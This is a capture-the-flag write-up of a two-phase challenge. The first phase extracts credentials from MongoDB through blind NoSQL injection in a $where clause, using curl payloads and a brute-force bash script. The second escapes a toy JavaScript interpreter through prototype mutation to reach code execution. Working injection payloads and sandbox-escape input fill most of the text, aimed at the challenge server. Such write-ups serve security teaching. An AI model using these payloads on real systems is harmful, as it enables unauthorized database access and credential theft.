#### NoSQL injection on MongoDB

> MojoJojo has obtained some secret information about the identities of our three favourite little ladies. We only know that he manages this site: http://challenges.ka0labs.org:31337, but we couldn't find anything. We need your help to get access!!?

When we visit the url we find the following:

<img alt="Main page" src="https://raw.githubusercontent.com/ka0labs/ctf-writeups/master/2016/nn6ed/imgs/mongojojo-1.png">

Looking into the source code we can see a couple of things:

```html
<!-- It's nice to design listening to your favourite song :)) https://youtu.be/UbA8TFYY-KY?t=4m54s -->
```

And the 3 images:

```html
<img src="/avatar/Q2FjdHVz">
<img src="/avatar/UGV0YWxv">
<img src="/avatar/QnVyYnVqYQ==">
```

Doing a quick check we see that these endpoints get a base64 string and cause a redirection to some static files:

```bash
$ curl -I http://challenges.ka0labs.org:31337/avatar/Q2FjdHVz
HTTP/1.1 302 Found
Server: nginx
Date: Thu, 06 Oct 2016 13:13:32 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 38
Connection: keep-alive
Location: /imgs/cactus.png
Vary: Accept
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
max_ranges: 0
```

Or, when modified:

```bash
$ curl -I "http://challenges.ka0labs.org:31337/avatar/$(echo -ne test | base64)"
HTTP/1.1 302 Found
Server: nginx
Date: Thu, 06 Oct 2016 13:16:21 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 37
Connection: keep-alive
Location: /imgs/undefined
Vary: Accept
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
max_ranges: 0
```

This `undefined` should ring a bell, since is very common in Javascript. We also see that some special chars or words, like single quotes, cause an error:

```bash
$ curl -I "http://challenges.ka0labs.org:31337/avatar/$(echo -ne \' | base64)"
HTTP/1.1 500 Internal Server Error
Server: nginx
Date: Thu, 06 Oct 2016 13:19:13 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 20
Connection: keep-alive
ETag: W/"14-T/08Zi7QtXFVEDkd9P0Srw"
```

With the title of the challenge we can guess that this was about a NoSQL injection, so we try to get a true/false query.

True:

```bash
$ curl -s -I "http://challenges.ka0labs.org:31337/avatar/$(echo -ne 'Cactus"&&(true)||"' | base64)" | grep Location
Location: /imgs/cactus.png
```

False:

```bash
$ curl -s -I "http://challenges.ka0labs.org:31337/avatar/$(echo -ne 'Cactus"&&(false)||"' | base64)" | grep Location
Location: /imgs/undefined
```

Ok, it's a blind injection, so the first attempt is try to enumerate the collections in the database: `db.getCollectionNames()`. Unfortunately, any access to the `db` object seems to fail.

At this point some hints were released:

> $where is my mind? https://www.youtube.com/watch?v=yFAnn2j4iB0

> RTFM: https://docs.mongodb.com/manual/reference/operator/query/where/

Now it should be obvious that the injection is inside a `$where` expression, for that reason we didn't have access to most objects. We had 2 options: guess the collection structure (was possible since the parameters were `username` and `password`, most users followed this way), or read the documentation and use some of the allowed methods.

Our expected solution uses `tojsononeline` and the regexp's `match` method. 

```bash
$ curl -s -I "http://challenges.ka0labs.org:31337/avatar/$(echo -ne 'Cactus"&&(tojsononeline(this).match(/^.*$/))||"' | base64)" | grep Location
Location: /imgs/cactus.png
```

The object `this` in a `$where` expression points to the document being queried in the current collection. So we only need to automatize the process :D

```bash
#!/bin/bash

URL="http://challenges.ka0labs.org:31337/avatar/"
injection=''

while true; do
    echo "Try '$injection'"
    for c in {'{','}','\s',',',':','_','!','@','"','\[','\]','\(','\)','\.',{a..z},{0..9},{A..Z}}; do
        res="$(curl -s -I "${URL}$(echo -ne "Cactus\"&&tojsononeline(this).match(/^${injection}${c}(.*)$/)||\"" | base64 | tr -d '\n')")"
        echo "$res" | grep -q "Location: /imgs/.*.png"
        if [ $? -eq 0 ]; then
            echo "Match '$c'"
            injection="$injection$c"
            break
        fi
    done
done
```

After some test & error (special chars may give problems), and sooome time (using threads would had been nice) we get the following structure:

`{\s\s"_id"\s:\sObjectId\("57d6bc5c27913d21a0bbad44"\),\s\s"user"\s:\s"Cactus",\s\s"password"\s:\s"CuidadoQueQuemo",\s\s"avatar"\s:\s"cactus\.png",\s\s"admin"\s:\s"NO"\s}`

Since we want the administrator, we need to change our injection a little: `"||this.admin=="YES"&&tojsononeline(this).match(/^(.*)/$)||"`. So we finally get:

`{\s\s"_id"\s:\sObjectId\("57d6bc3c27913d21a0bbad41"\),\s\s"user"\s:\s"MojoJojo",\s\s"password"\s:\s"bubbles{Ih4t3Sup3RG1rrrlz}",\s\s"avatar"\s:\s"mojo\.png",\s\s"admin"\s:\s"YES"\s}`

and the flag!!

#### bubbles{Ih4t3Sup3RG1rrrlz}

## Phase 2 (80 pts)
======

#### Escape JS sandbox mutating objects

Once we have obtained the user and password, we can login (it was easy to figure out the `/admin` panel) and we find a rare shell named `MoJS`.

<img alt="Admin page" src="https://raw.githubusercontent.com/ka0labs/ctf-writeups/master/2016/nn6ed/imgs/mongojojo-3.png">

Again, if we read the source code we see that whatever we type in the terminal is sent via websockets and we get a response (mostly some kind of syntax error). Additionally, we can read some HTML comments giving some information about the "sandbox" or the languaged used:

```html
 <!--<h3>Notes:</h3>
    <ul>
        Ok, with all that languages out there I sometimes forget my own =_='
        <li> Types: only integers to count
        <li> Operations: addition with '+'
        <li> Auxiliar functions: 'help'
        <li> Assign to 'result' to see output
    </ul>
-->
```

During the contest several hints were given, including the source code of the server-side interpreter:

> El source code de MoJS está disponible desde ayer por la noche a través de la función "help"

> Javascript objects have prototypes. Mutate the scope.

> ULTIMATE HINT: Each session has a separate scope object, initially with 2 properties (floppyDisk, bitcoins) and a method (help function). Identifiers are simply property access on the scope object. You can create, read and modify any of them. The unique operators are '+' and '='. Parser only understand integers, but Javascript loves to cast ;) And again. Luke, use the prototype...

Source:

```javascript
// Source: http://alf.nu/ReturnTrue
function execute(sessId, raw) {
    var tokens = raw.match(/(\\w+|[+=();])/g);

    var peek = _ => tokens[0];
    var eat = _ => tokens.shift();
    var ate = x => peek() === x && eat();
    var want = x => { if (!ate(x)) throw 'Expected "'+x+'" at '+JSON.stringify(tokens); };

    function statement() {
        scope[sessId][eat()] = [want('='), expr(), want(';')][1];
    }

    function expr() {
        for (var v = term(); ate('+'); v = v + term());
        return v;
    }

    function term() {
        for (var v = atom(); ate('('); v = v([expr(), want(')')][0]));
        return v;
    }

    function atom() {
        var p = eat(), n = parseInt(p);
        if (!isNaN(n)) return n;
        if (!(p in scope[sessId])) throw 'Undefined '+p;
        return scope[sessId][p];
    }

    while (peek()) statement();
}
```

Our input is tokenized and executed. As the "ultimate hint" tell us, we are only able to modify and access the properties of a Javascript object, which initially only has 2 useless properties. However, if we know a little about Javascript, we find out that there are much more properties accessible, like `valueOf, toString, constructor, __proto__, __defineGetter__, __defineSetter__, isPrototypeOf` and a few more.

We have several syntactic restrictions:

* No commas. Functions can only have one argument.
* No point or square brackets. We can't access properties from other objets.
* No string literals, arrays, regexps, objects, booleans or floats. The only literals available are positive integers.

And we also know that the output is returned by assignating the property `result`. Below there are some examples:

<img alt="Shell errors" width="50%" src="https://raw.githubusercontent.com/ka0labs/ctf-writeups/master/2016/nn6ed/imgs/mongojojo-4.png">

Since we had the source code, it was much easier to test in local without all the network overhead (and you also could debug). The challenge may seem frustrating at the begining, we have very few things to do, but at some point we realize that we can redefine the prototype of our object. For instance:

```javascript
var obj = {};
obj.__proto__ = obj.constructor; // Object
```

With this assignment, we are setting all the properties of `Object` (which is our `constructor`) in our prototype, what means that now they are in our scope and we are able to access them.

```
MojoJojo's s3cret sh3ll!
MoJS> __proto__=constructor; result=keys;
"function keys() { [native code] }"
MoJS>
```

In fact, we can repeat this process in order to access the `constructor` of our `constructor`, and, meanwhile, save some interesting references into our object:

```
MoJS> __proto__=constructor; foo=keys; result=constructor;
"function Function() { [native code] }"
MoJS> result=foo;
"function keys() { [native code] }"
MoJS>
```

`Function` is basically an equivalent to `eval`. Hence, if we are able to construct an arbitrary string we will have code execution :D Unfortunately this is also the trickiest part of the challenge.  There were many solutions, our expected one was to mutate our object into an string, and access the `fromCharCode` method to generate characters from numbers. Luckily, Javascript's `+` operator is also used for concatenation :)

```javascript
var obj = {};
obj.__proto__ = Object(""); // string literal
obj.__proto__ = obj.constructor; // String
```

Passing a string into the `Object` constructor will return a string object, which has `String` as constructor. In order to generate this first string we can try to use some property in scope which was a string (like `name` in any function), or we can concatenate a function with a number (yep, js rulez):

```
MoJS> result=help+0;
"function () { return execute.toString(); }0"
MoJS>
```

Now we need to put all together. Let's do it, step by step:

```
MoJS> __proto__=constructor(help+0); // string literal in scope
"undefined"
MoJS> __proto__=constructor; // String "class"
"function String() { [native code] }"
MoJS> result=fromCharCode; // we can access its methods :)
"function fromCharCode() { [native code] }"
MoJS> result=constructor; // String's constructor is Function again
"function Function() { [native code] }"
MoJS> result=constructor(fromCharCode(120))(0); // Function('x')(0) 
"x is not defined"
"function Function() { [native code] }"
MoJS> 
```

And since we have code execution, we can try checking the global scope `return Object.keys(this)`:

```
MoJS> __proto__=constructor(help+0);__proto__=constructor;b=fromCharCode;result=constructor(b(114)+b(101)+b(116)+b(117)+b(114)+b(110)+b(32)+b(79)+b(98)+b(106)+b(101)+b(99)+b(116)+b(46)+b(107)+b(101)+b(121)+b(115)+b(40)+b(116)+b(104)+b(105)+b(115)+b(41))(0);
"execute,scope,fl4g"
MoJS>
```

Uooh! Easy peasy! We got flag `return fl4g`:

```
MoJS> __proto__=constructor(help+0);__proto__=constructor;b=fromCharCode;result=constructor(b(114)+b(101)+b(116)+b(117)+b(114)+b(110)+b(32)+b(102)+b(108)+b(52)+b(103))(0);
"nn6ed{js_m3t4pr0gamming_sk1lls_ftw!}"
MoJS>
```

#### nn6ed{js_m3t4pr0gamming_sk1lls_ftw!}
